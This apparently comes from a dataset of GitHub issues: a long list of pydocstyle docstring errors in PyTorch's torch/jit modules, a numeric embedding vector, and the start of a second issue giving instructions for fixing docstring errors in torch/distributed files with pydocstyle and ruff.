- **Error Code**: **D205**, **File**: `torch/jit/_freeze.py`, **Entity**: `run_frozen_optimizations`, **Line**: 125, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D401**, **File**: `torch/jit/_freeze.py`, **Entity**: `run_frozen_optimizations`, **Line**: 125, **Description**: First line should be in imperative mood (perhaps 'Run', not 'Runs')
- **Error Code**: **D205**, **File**: `torch/jit/_freeze.py`, **Entity**: `optimize_for_inference`, **Line**: 178, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/jit/_freeze.py`, **Entity**: `optimize_for_inference`, **Line**: 178, **Description**: First line should end with a period (not 'e')
- **Error Code**: **D401**, **File**: `torch/jit/_freeze.py`, **Entity**: `optimize_for_inference`, **Line**: 178, **Description**: First line should be in imperative mood (perhaps 'Perform', not 'Performs')
- **Error Code**: **D205**, **File**: `torch/jit/_recursive.py`, **Entity**: `infer_concrete_type_builder`, **Line**: 129, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/jit/_recursive.py`, **Entity**: `infer_concrete_type_builder`, **Line**: 129, **Description**: First line should end with a period (not 's')
- **Error Code**: **D205**, **File**: `torch/jit/_recursive.py`, **Entity**: `get_or_create_concrete_type`, **Line**: 365, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/jit/_recursive.py`, **Entity**: `get_or_create_concrete_type`, **Line**: 365, **Description**: First line should end with a period (not 'T')
- **Error Code**: **D205**, **File**: `torch/jit/_recursive.py`, **Entity**: `get_module_concrete_type`, **Line**: 409, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/jit/_recursive.py`, **Entity**: `get_module_concrete_type`, **Line**: 409, **Description**: First line should end with a period (not 'e')
- **Error Code**: **D401**, **File**: `torch/jit/_recursive.py`, **Entity**: `get_module_concrete_type`, **Line**: 409, **Description**: First line should be in imperative mood (perhaps 'Get', not 'Gets')
- **Error Code**: **D400**, **File**: `torch/jit/_recursive.py`, **Entity**: `create_script_module`, **Line**: 460, **Description**: First line should end with a period (not 'e')
- **Error Code**: **D401**, **File**: `torch/jit/_recursive.py`, **Entity**: `create_script_module`, **Line**: 460, **Description**: First line should be in imperative mood (perhaps 'Create', not 'Creates')
- **Error Code**: **D205**, **File**: `torch/jit/_recursive.py`, **Entity**: `infer_methods_to_compile`, **Line**: 711, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/jit/_recursive.py`, **Entity**: `infer_methods_to_compile`, **Line**: 711, **Description**: First line should end with a period (not 'g')
- **Error Code**: **D401**, **File**: `torch/jit/_recursive.py`, **Entity**: `infer_methods_to_compile`, **Line**: 711, **Description**: First line should be in imperative mood (perhaps 'Implement', not 'Implements')
- **Error Code**: **D200**, **File**: `torch/jit/_recursive.py`, **Entity**: `get_hook_stubs`, **Line**: 766, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **Error Code**: **D400**, **File**: `torch/jit/_recursive.py`, **Entity**: `get_hook_stubs`, **Line**: 766, **Description**: First line should end with a period (not 's')
- **Error Code**: **D401**, **File**: `torch/jit/_recursive.py`, **Entity**: `get_hook_stubs`, **Line**: 766, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **Error Code**: **D205**, **File**: `torch/jit/_recursive.py`, **Entity**: `get_property_stubs`, **Line**: 802, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/jit/_recursive.py`, **Entity**: `get_property_stubs`, **Line**: 802, **Description**: First line should end with a period (not 'd')
- **Error Code**: **D205**, **File**: `torch/jit/_recursive.py`, **Entity**: `interface_script`, **Line**: 823, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/jit/_recursive.py`, **Entity**: `interface_script`, **Line**: 823, **Description**: First line should end with a period (not 'r')
- **Error Code**: **D401**, **File**: `torch/jit/_recursive.py`, **Entity**: `interface_script`, **Line**: 823, **Description**: First line should be in imperative mood (perhaps 'Make', not 'Makes')
- **Error Code**: **D205**, **File**: `torch/jit/_recursive.py`, **Entity**: `infer_interface_methods_to_compile`, **Line**: 837, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/jit/_recursive.py`, **Entity**: `infer_interface_methods_to_compile`, **Line**: 837, **Description**: First line should end with a period (not 'h')
- **Error Code**: **D200**, **File**: `torch/jit/_recursive.py`, **Entity**: `wrap_cpp_class`, **Line**: 870, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **Error Code**: **D200**, **File**: `torch/jit/_recursive.py`, **Entity**: `wrap_cpp_module`, **Line**: 876, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **Error Code**: **D400**, **File**: `torch/jit/_recursive.py`, **Entity**: `wrap_cpp_module`, **Line**: 876, **Description**: First line should end with a period (not 's')
- **Error Code**: **D205**, **File**: `torch/jit/_recursive.py`, **Entity**: `lazy_bind`, **Line**: 902, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/jit/_recursive.py`, **Entity**: `lazy_bind`, **Line**: 902, **Description**: First line should end with a period (not 'd')
- **Error Code**: **D401**, **File**: `torch/jit/_recursive.py`, **Entity**: `lazy_bind`, **Line**: 902, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **Error Code**: **D400**, **File**: `torch/jit/_serialization.py`, **Entity**: ``, **Line**: 1, **Description**: First line should end with a period (not 'n')
- **Error Code**: **D205**, **File**: `torch/jit/_serialization.py`, **Entity**: `save`, **Line**: 19, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/jit/_serialization.py`, **Entity**: `save`, **Line**: 19, **Description**: First line should end with a period (not 'e')
- **Error Code**: **D412**, **File**: `torch/jit/_serialization.py`, **Entity**: `save`, **Line**: 19, **Description**: No blank lines allowed between a section header and its content ('Example')
- **Error Code**: **D202**, **File**: `torch/jit/_serialization.py`, **Entity**: `load`, **Line**: 87, **Description**: No blank lines allowed after function docstring (found 1)
- **Error Code**: **D205**, **File**: `torch/jit/_serialization.py`, **Entity**: `load`, **Line**: 87, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/jit/_serialization.py`, **Entity**: `load`, **Line**: 87, **Description**: First line should end with a period (not 'y')
- **Error Code**: **D202**, **File**: `torch/jit/_serialization.py`, **Entity**: `save_jit_module_to_flatbuffer`, **Line**: 196, **Description**: No blank lines allowed after function docstring (found 1)
- **Error Code**: **D205**, **File**: `torch/jit/_serialization.py`, **Entity**: `save_jit_module_to_flatbuffer`, **Line**: 196, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/jit/_serialization.py`, **Entity**: `save_jit_module_to_flatbuffer`, **Line**: 196, **Description**: First line should end with a period (not 'e')
- **Error Code**: **D412**, **File**: `torch/jit/_serialization.py`, **Entity**: `save_jit_module_to_flatbuffer`, **Line**: 196, **Description**: No blank lines allowed between a section header and its content ('Example')
- **Error Code**: **D205**, **File**: `torch/jit/_serialization.py`, **Entity**: `get_flatbuffer_module_info`, **Line**: 247, **Description**: 1 blank line required between summary line and description (found 2)
- **Error Code**: **D400**, **File**: `torch/jit/annotations.py`, **Entity**: `_eval_no_call`, **Line**: 150, **Description**: First line should end with a period (not 's')
- **Error Code**: **D401**, **File**: `torch/jit/annotations.py`, **Entity**: `parse_type_line`, **Line**: 159, **Description**: First line should be in imperative mood (perhaps 'Parse', not 'Parses')
- **Error Code**: **D401**, **File**: `torch/jit/annotations.py`, **Entity**: `get_type_line`, **Line**: 185, **Description**: First line should be in imperative mood (perhaps 'Try', not 'Tries')
- **Error Code**: **D401**, **File**: `torch/jit/annotations.py`, **Entity**: `split_type_line`, **Line**: 247, **Description**: First line should be in imperative mood (perhaps 'Split', not 'Splits')
- **Error Code**: **D401**, **File**: `torch/jit/annotations.py`, **Entity**: `try_real_annotations`, **Line**: 265, **Description**: First line should be in imperative mood (perhaps 'Try', not 'Tries')
- **Error Code**: **D400**, **File**: `torch/jit/_script.py`, **Entity**: ``, **Line**: 1, **Description**: First line should end with a period (not 't')
- **Error Code**: **D205**, **File**: `torch/jit/_script.py`, **Entity**: `unpackage_script_module`, **Line**: 361, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D401**, **File**: `torch/jit/_script.py`, **Entity**: `unpackage_script_module`, **Line**: 361, **Description**: First line should be in imperative mood (perhaps 'Call', not 'Called')
- **Error Code**: **D204**, **File**: `torch/jit/_script.py`, **Entity**: `RecursiveScriptClass`, **Line**: 414, **Description**: 1 blank line required after class docstring (found 0)
- **Error Code**: **D205**, **File**: `torch/jit/_script.py`, **Entity**: `RecursiveScriptClass`, **Line**: 414, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D204**, **File**: `torch/jit/_script.py`, **Entity**: `ScriptModule`, **Line**: 487, **Description**: 1 blank line required after class docstring (found 0)
- **Error Code**: **D205**, **File**: `torch/jit/_script.py`, **Entity**: `ScriptModule`, **Line**: 487, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/jit/_script.py`, **Entity**: `ScriptModule`, **Line**: 487, **Description**: First line should end with a period (not 's')
- **Error Code**: **D205**, **File**: `torch/jit/_script.py`, **Entity**: `__reduce_package__`, **Line**: 550, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/jit/_script.py`, **Entity**: `__reduce_package__`, **Line**: 550, **Description**: First line should end with a period (not 'n')
- **Error Code**: **D401**, **File**: `torch/jit/_script.py`, **Entity**: `__reduce_package__`, **Line**: 550, **Description**: First line should be in imperative mood (perhaps 'Call', not 'Called')
- **Error Code**: **D204**, **File**: `torch/jit/_script.py`, **Entity**: `RecursiveScriptModule`, **Line**: 566, **Description**: 1 blank line required after class docstring (found 0)
- **Error Code**: **D205**, **File**: `torch/jit/_script.py`, **Entity**: `RecursiveScriptModule`, **Line**: 566, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/jit/_script.py`, **Entity**: `RecursiveScriptModule`, **Line**: 566, **Description**: First line should end with a period (not 'n')
- **Error Code**: **D205**, **File**: `torch/jit/_script.py`, **Entity**: `_construct`, **Line**: 601, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/jit/_script.py`, **Entity**: `_construct`, **Line**: 601, **Description**: First line should end with a period (not 'h')
- **Error Code**: **D205**, **File**: `torch/jit/_script.py`, **Entity**: `graph`, **Line**: 668, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/jit/_script.py`, **Entity**: `graph`, **Line**: 668, **Description**: First line should end with a period (not 'e')
- **Error Code**: **D205**, **File**: `torch/jit/_script.py`, **Entity**: `inlined_graph`, **Line**: 676, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/jit/_script.py`, **Entity**: `inlined_graph`, **Line**: 676, **Description**: First line should end with a period (not 'e')
- **Error Code**: **D205**, **File**: `torch/jit/_script.py`, **Entity**: `code`, **Line**: 685, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/jit/_script.py`, **Entity**: `code`, **Line**: 685, **Description**: First line should end with a period (not 'f')
- **Error Code**: **D400**, **File**: `torch/jit/_script.py`, **Entity**: `code_with_constants`, **Line**: 694, **Description**: First line should end with a period (not '
- **Error Code**: **D400**, **File**: `torch/jit/_script.py`, **Entity**: `save`, **Line**: 708, **Description**: First line should end with a period (not ')')
- **Error Code**: **D402**, **File**: `torch/jit/_script.py`, **Entity**: `save`, **Line**: 708, **Description**: First line should not be the function's ""signature""
- **Error Code**: **D400**, **File**: `torch/jit/_script.py`, **Entity**: `_save_for_lite_interpreter`, **Line**: 716, **Description**: First line should end with a period (not ')')
- **Error Code**: **D402**, **File**: `torch/jit/_script.py`, **Entity**: `_save_for_lite_interpreter`, **Line**: 716, **Description**: First line should not be the function's ""signature""
- **Error Code**: **D205**, **File**: `torch/jit/_script.py`, **Entity**: `create_script_list`, **Line**: 1024, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D205**, **File**: `torch/jit/_script.py`, **Entity**: `script`, **Line**: 1039, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/jit/_script.py`, **Entity**: `script`, **Line**: 1039, **Description**: First line should end with a period (not 'e')
- **Error Code**: **D400**, **File**: `torch/jit/_trace.py`, **Entity**: ``, **Line**: 1, **Description**: First line should end with a period (not 'g')
- **Error Code**: **D205**, **File**: `torch/jit/_trace.py`, **Entity**: `verify`, **Line**: 190, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/jit/_trace.py`, **Entity**: `verify`, **Line**: 190, **Description**: First line should end with a period (not 'd')
- **Error Code**: **D205**, **File**: `torch/jit/_trace.py`, **Entity**: `trace`, **Line**: 629, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D301**, **File**: `torch/jit/_trace.py`, **Entity**: `trace`, **Line**: 629, **Description**: Use r"""""" if any backslashes in a docstring
- **Error Code**: **D400**, **File**: `torch/jit/_trace.py`, **Entity**: `trace`, **Line**: 629, **Description**: First line should end with a period (not '`')
- **Error Code**: **D205**, **File**: `torch/jit/_trace.py`, **Entity**: `trace_module`, **Line**: 919, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/jit/_trace.py`, **Entity**: `trace_module`, **Line**: 919, **Description**: First line should end with a period (not 'd')
- **Error Code**: **D205**, **File**: `torch/jit/_trace.py`, **Entity**: `is_tracing`, **Line**: 1103, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/jit/_trace.py`, **Entity**: `is_tracing`, **Line**: 1103, **Description**: First line should end with a period (not 'f')
- **Error Code**: **D401**, **File**: `torch/jit/_trace.py`, **Entity**: `is_tracing`, **Line**: 1103, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **Error Code**: **D205**, **File**: `torch/jit/_trace.py`, **Entity**: `_get_trace_graph`, **Line**: 1234, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/jit/_trace.py`, **Entity**: `_get_trace_graph`, **Line**: 1234, **Description**: First line should end with a period (not '
- **Error Code**: **D205**, **File**: `torch/jit/__init__.py`, **Entity**: `export_opnames`, **Line**: 100, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D208**, **File**: `torch/jit/__init__.py`, **Entity**: `export_opnames`, **Line**: 100, **Description**: Docstring is over-indented
- **Error Code**: **D400**, **File**: `torch/jit/__init__.py`, **Entity**: `export_opnames`, **Line**: 100, **Description**: First line should end with a period (not 't')
- **Error Code**: **D401**, **File**: `torch/jit/__init__.py`, **Entity**: `export_opnames`, **Line**: 100, **Description**: First line should be in imperative mood (perhaps 'Generate', not 'Generates')
- **Error Code**: **D205**, **File**: `torch/jit/__init__.py`, **Entity**: `annotate`, **Line**: 118, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/jit/__init__.py`, **Entity**: `annotate`, **Line**: 118, **Description**: First line should end with a period (not 't')
- **Error Code**: **D401**, **File**: `torch/jit/__init__.py`, **Entity**: `annotate`, **Line**: 118, **Description**: First line should be in imperative mood; try rephrasing (found 'This')
- **Error Code**: **D202**, **File**: `torch/jit/__init__.py`, **Entity**: `script_if_tracing`, **Line**: 165, **Description**: No blank lines allowed after function docstring (found 1)
- **Error Code**: **D205**, **File**: `torch/jit/__init__.py`, **Entity**: `script_if_tracing`, **Line**: 165, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/jit/__init__.py`, **Entity**: `script_if_tracing`, **Line**: 165, **Description**: First line should end with a period (not '`')
- **Error Code**: **D205**, **File**: `torch/jit/__init__.py`, **Entity**: `isinstance`, **Line**: 187, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/jit/__init__.py`, **Entity**: `isinstance`, **Line**: 187, **Description**: First line should end with a period (not 'e')
- **Error Code**: **D401**, **File**: `torch/jit/__init__.py`, **Entity**: `isinstance`, **Line**: 187, **Description**: First line should be in imperative mood; try rephrasing (found 'This')
- **Error Code**: **D205**, **File**: `torch/jit/__init__.py`, **Entity**: `strict_fusion`, **Line**: 228, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/jit/__init__.py`, **Entity**: `strict_fusion`, **Line**: 228, **Description**: First line should end with a period (not 'n')
- **Error Code**: **D412**, **File**: `torch/jit/__init__.py`, **Entity**: `strict_fusion`, **Line**: 228, **Description**: No blank lines allowed between a section header and its content ('Example')
- **Error Code**: **D200**, **File**: `torch/jit/__init__.py`, **Entity**: `enable_onednn_fusion`, **Line**: 269, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **Error Code**: **D202**, **File**: `torch/jit/__init__.py`, **Entity**: `enable_onednn_fusion`, **Line**: 269, **Description**: No blank lines allowed after function docstring (found 1)
- **Error Code**: **D401**, **File**: `torch/jit/__init__.py`, **Entity**: `enable_onednn_fusion`, **Line**: 269, **Description**: First line should be in imperative mood (perhaps 'Enable', not 'Enables')
- **Error Code**: **D200**, **File**: `torch/jit/__init__.py`, **Entity**: `onednn_fusion_enabled`, **Line**: 276, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **Error Code**: **D400**, **File**: `torch/jit/__init__.py`, **Entity**: `onednn_fusion_enabled`, **Line**: 276, **Description**: First line should end with a period (not 'd')
- **Error Code**: **D401**, **File**: `torch/jit/__init__.py`, **Entity**: `onednn_fusion_enabled`, **Line**: 276, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **Error Code**: **D205**, **File**: `torch/jit/mobile/__init__.py`, **Entity**: `_load_for_lite_interpreter`, **Line**: 9, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/jit/mobile/__init__.py`, **Entity**: `_load_for_lite_interpreter`, **Line**: 9, **Description**: First line should end with a period (not '`')
- **Error Code**: **D205**, **File**: `torch/jit/mobile/__init__.py`, **Entity**: `_export_operator_list`, **Line**: 72, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D208**, **File**: `torch/jit/mobile/__init__.py`, **Entity**: `_export_operator_list`, **Line**: 72, **Description**: Docstring is over-indented
- **Error Code**: **D400**, **File**: `torch/jit/mobile/__init__.py`, **Entity**: `_export_operator_list`, **Line**: 72, **Description**: First line should end with a period (not 'd')
- **Error Code**: **D403**, **File**: `torch/jit/mobile/__init__.py`, **Entity**: `_export_operator_list`, **Line**: 72, **Description**: First word of the first line should be properly capitalized ('Return', not 'return')
- **Error Code**: **D205**, **File**: `torch/jit/mobile/__init__.py`, **Entity**: `_get_model_bytecode_version`, **Line**: 79, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/jit/mobile/__init__.py`, **Entity**: `_get_model_bytecode_version`, **Line**: 79, **Description**: First line should end with a period (not '
- **Error Code**: **D205**, **File**: `torch/jit/mobile/__init__.py`, **Entity**: `_get_mobile_model_contained_types`, **Line**: 110, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/jit/mobile/__init__.py`, **Entity**: `_get_mobile_model_contained_types`, **Line**: 110, **Description**: First line should end with a period (not '
- **Error Code**: **D205**, **File**: `torch/jit/mobile/__init__.py`, **Entity**: `_backport_for_mobile`, **Line**: 140, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/jit/mobile/__init__.py`, **Entity**: `_backport_for_mobile`, **Line**: 140, **Description**: First line should end with a period (not '
- **Error Code**: **D205**, **File**: `torch/jit/mobile/__init__.py`, **Entity**: `_backport_for_mobile_to_buffer`, **Line**: 162, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/jit/mobile/__init__.py`, **Entity**: `_backport_for_mobile_to_buffer`, **Line**: 162, **Description**: First line should end with a period (not '
- **Error Code**: **D205**, **File**: `torch/jit/mobile/__init__.py`, **Entity**: `_get_model_ops_and_info`, **Line**: 180, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/jit/mobile/__init__.py`, **Entity**: `_get_model_ops_and_info`, **Line**: 180, **Description**: First line should end with a period (not 'g')
- **Error Code**: **D401**, **File**: `torch/jit/mobile/__init__.py`, **Entity**: `_get_model_ops_and_info`, **Line**: 180, **Description**: First line should be in imperative mood; try rephrasing (found 'A')

cc @carljparker",False,"[-3.83913845e-01 -4.35990393e-01  3.59803438e-04 -3.19483072e-01
  1.22392267e-01  1.40130937e-01  2.63775680e-02 -1.45512950e-02
 -3.29933047e-01  2.08577871e-01  2.24987045e-02  2.53800526e-02
  5.58034778e-02  4.05671656e-01 -1.77607611e-01  3.35641682e-01
 -4.61326361e-01 -1.90615624e-01  3.19595695e-01  1.92924142e-01
  4.05457556e-01  3.90739799e-01 -3.14769447e-01  7.97195137e-02
 -4.00475949e-01  8.92851129e-02 -3.51322979e-01 -2.80412883e-01
 -3.90339121e-02  2.07575947e-01  2.51623452e-01  2.77490258e-01
 -7.72126392e-02  1.04449674e-01  4.74650979e-01  1.79118022e-01
 -2.48476401e-01 -7.67560452e-02  7.70472884e-02 -5.35516813e-02
  1.51806757e-01 -1.20596491e-01 -2.33044893e-01  4.05384675e-02
 -4.25421856e-02 -1.89643264e-01 -1.53570339e-01  3.02951038e-01
 -1.37661010e-01  4.23666388e-02 -2.87183285e-01  1.29062057e-01
 -5.62697232e-01 -2.10364666e-02  1.97458744e-01 -3.72970179e-02
  8.86420161e-02  5.80683827e-01  1.99982226e-02 -3.57073955e-02
  1.34896830e-01  8.13571811e-02  1.06319949e-01  2.78877020e-01
 -5.56231700e-02  4.14060831e-01  6.18148334e-02  2.70843178e-01
  4.70088601e-01 -2.25819305e-01 -5.95514029e-02  2.04644781e-02
 -4.66247231e-01  1.41336424e-02  5.57925105e-02  1.49383426e-01
 -2.98344612e-01 -1.03264585e-01 -2.28623062e-01  1.16176624e-02
 -4.66459990e-01 -5.39716557e-02  2.14653701e-01 -2.71384776e-01
  4.33028266e-02 -6.13811798e-02  2.22787410e-01 -4.00751717e-02
  7.79828951e-02  4.38284427e-02  4.56001818e-01 -1.70916095e-02
  2.06247628e-01  3.58004034e-01  3.27594191e-01  2.87295550e-01
  8.51405114e-02 -1.55683473e-01  3.16557623e-02 -4.26699936e-01
  1.78299010e-01 -4.41604346e-01 -1.94386423e-01  4.12968844e-01
  3.44550051e-02  1.91489030e-02  1.61549374e-01 -9.99139249e-02
  1.10886469e-01  1.05945915e-01  1.10792734e-01 -1.80741623e-01
  3.31090033e-01  5.54864034e-02  1.31332368e-01  2.37455383e-01
 -2.16552466e-01  1.18310355e-01 -3.13953757e-01  4.12170559e-01
  2.29227006e-01  2.43314803e-01  1.61839202e-01  1.37583733e-01
  1.20238215e-02 -2.97475625e-02  2.10611001e-01 -4.41703834e-02
  1.97020203e-01 -1.88468918e-01  3.56445611e-01 -6.35408461e-02
 -1.58054143e-01  2.74155617e-01  1.42503291e-01  1.19339926e-02
 -2.07559496e-01 -3.71509612e-01 -1.83402985e-01 -3.60796526e-02
 -4.19139832e-01 -3.28541815e-01 -3.49246085e-01 -2.22844735e-01
  5.37289500e-01  4.64123487e-01 -4.73844409e-01  4.86274093e-01
  1.10648975e-01  1.74914420e-01  7.36946166e-02 -3.07856128e-03
 -2.92413235e-01  4.19278860e-01 -1.73943713e-01  1.46241665e-01
  7.20243454e-01 -2.81384327e-02 -2.96617925e-01 -5.41042566e-01
 -1.09826401e-01  2.27513731e-01 -2.60059424e-02 -1.31180286e-01
 -1.82970226e-01 -3.90867628e-02 -2.77532548e-01 -1.75376952e-01
 -5.71423292e-01 -1.15761317e-01  2.24933904e-02  2.16104418e-01
 -1.43470988e-01 -1.07781865e-01 -5.43486699e-03  1.67784184e-01
 -2.72718489e-01 -4.28506345e-01 -5.66766262e-02  3.61834764e-01
 -1.91512391e-01  2.89924860e-01 -1.36779854e-03 -6.26757294e-02
  5.94344549e-03  7.43033811e-02  1.24222718e-01 -1.94672957e-01
  1.42752394e-01  6.95115849e-02  1.11670271e-01 -4.87375140e-01
  3.31149042e-01 -7.59399533e-02 -2.67663211e-01 -1.34479746e-01
  3.50474924e-01  5.10831952e-01 -9.75170806e-02  1.85100645e-01
 -1.21671230e-01  1.72546983e-01  2.14141756e-01 -4.25886363e-03
  3.22833896e-01  3.20576131e-02 -3.29873830e-01 -2.19970584e-01
 -3.45871955e-01  2.35898346e-01 -5.00770390e-01 -1.85615465e-01
  4.58922237e-02 -4.54291046e-01 -2.81878173e-01  5.03164887e-01
  1.29889399e-01 -9.99252722e-02  3.25504869e-01 -4.00973320e-01
 -4.36497331e-02 -2.10560352e-01 -1.07446142e-01 -3.09042752e-01
  7.81392083e-02  5.65847196e-03 -1.70844018e-01  2.60540694e-01
 -1.02226123e-01  8.56857374e-02 -9.28933322e-02  2.27383927e-01
  6.02953672e-01 -1.87043607e-01  3.85744572e-01  6.17277659e-02
 -1.86545253e-01 -5.76387420e-02 -8.98387283e-02  4.70032811e-01
  5.67735955e-02  3.52433562e-01  5.50394654e-02 -7.91756958e-02
  2.09154859e-01 -2.97749043e-01 -2.68524408e-01 -2.56577313e-01
 -5.12573063e-01  7.38367885e-02 -2.60230213e-01 -7.49339104e-01
  2.12997377e-01  2.03975439e-01  5.26881158e-01  2.26020634e-01
 -4.79346275e-01 -1.67502403e-01  5.43342493e-02 -2.30908021e-03
  2.80887559e-02  2.08453149e-01 -1.81609869e-01  1.51791751e-01
  3.62591654e-01  1.19590305e-01 -3.76525968e-01  2.91701674e-01
  1.88124590e-02 -2.28242919e-01  1.43450305e-01 -4.74422306e-01
  4.47019100e-01  1.94990814e-01  3.69425505e-01 -1.56687219e-02
  3.60266477e-01 -3.33242655e-01 -1.17814839e-01  7.42134750e-02
 -2.58834839e-01  3.91135275e-01 -3.43799651e-01 -8.08736831e-02
  3.69751394e-01 -7.50364959e-02 -1.25546753e-01 -4.49202538e-01
 -3.81178409e-01 -1.97739780e-01 -2.53990501e-01  1.52656421e-01
  6.85968220e-01 -1.86465263e-01  1.83098704e-01  1.32248014e-01
 -6.58699572e-02  2.25658715e-01  2.49562934e-01 -7.84636810e-02
 -5.97990930e-01 -8.57944861e-02 -1.76520813e-02  2.05469966e-01
  4.11519378e-01  7.99620897e-02  1.01984486e-01  3.13411891e-01
  3.10608093e-02 -4.11527753e-01  5.89919329e-01  3.34393680e-01
 -1.56850010e-01  1.13278739e-02 -9.32947174e-02  6.67295530e-02
  1.15142278e-01  7.57174492e-01  3.17586780e-01 -7.69156516e-02
 -2.12177709e-02 -4.28673476e-01 -2.70541370e-01 -2.20506871e-03
  5.98160252e-02 -1.29591540e-01 -2.58598924e-01  3.92962173e-02
 -3.78664017e-01 -3.65853965e-01  3.14802900e-02  2.52685428e-01
 -1.14334621e-01 -1.25215068e-01  1.54749319e-01  2.19107121e-01
 -2.11503506e-01  2.18370467e-01  2.00084716e-01 -4.37479973e-01
  1.50666803e-01 -1.75522745e-01  2.73216009e-01 -5.22919357e-01
 -1.86617106e-01 -1.91036284e-01  2.81329006e-01  3.51345718e-01
 -2.19039768e-01 -5.35830446e-02  4.18788612e-01 -1.35681748e-01
 -1.67539790e-01  7.31078014e-02 -3.20673883e-01  3.29533070e-01
 -7.04235062e-02  8.41885656e-02  2.93189213e-02  3.09019566e-01
 -5.17626643e-01 -4.89649251e-02 -3.30371022e-01 -5.13554692e-01
  1.43674761e-01 -2.28670418e-01  8.25784355e-02 -6.41912147e-02
  1.93023607e-02  1.26547933e-01 -3.20697963e-01  2.71276474e-01
 -2.78030097e-01  2.73550808e-01  2.52854168e-01  1.65299058e-01
  2.33837768e-01  1.64169595e-01  1.09235436e-01 -2.54237175e-01
 -4.63793188e-01  3.61486197e-01  4.29417372e-01 -3.90330344e-01]"
"Fix docstring errors in input_reshard.py, tensor_ops.py, view_ops.py, api.py, storage.py, fsdp_checkpoint_example.py, utils.py, memory_tracker.py, default_planner.py, _nested_dict.py, _fsspec_filesystem.py, multihead_attention_tp.py, _view_with_dim_change.py, state_dict_saver.py, op_coverage.py, planner.py, filesystem.py, fsdp.py, common_rules.py, planner_helpers.py, state_dict_loader.py, style.py, resharding.py, _sharded_tensor_utils.py, _traverse.py, optimizer.py, _utils.py, metadata.py module: docs triaged medium docathon-h2-2023","Please fix the following issues.
First, make sure to install the required tools:
```
pip3 install pydocstyle
```
```
pip3 install ruff
```
Then complete the followings steps:
 1. Run `pydocstyle` to see the number of errors in the file: 
 ```
pydocstyle path-to-file --count
```
 &nbsp; &nbsp; This command prints out the number of errors at the end of the output. Save this output to later add it to your PR description.
2. Next, run `ruff` which should help autofix many of these errors:
```
ruff --select RULECODE --fix path_to_file
```
&nbsp; &nbsp; `RULECODE` is the error code from the output in the issue, for example, **D200**. See the complete list of rules and autofixes [here](https://docs.astral.sh/ruff/rules/#pydocstyle-d).
3. You can run the above command with the `--unsafe-fixes` option. Double-check that the applied fixes are correct.
4. Fix the remaining issues. Fix **only** the errors listed in the issue. Skip the 'Missing docstrings' errors.
5. Run pydocstyle again:
```
pydocstyle path-to-file --count
```
This **number might not be 0** which is **OK**. Add the count of fixed errors to your PR description. 
- **Error Code**: **D400**, **File**: `torch/distributed/_tensor/ops/view_ops.py`, **Entity**: `Singleton`, **Line**: 39, **Description**: First line should end with a period (not 'n')
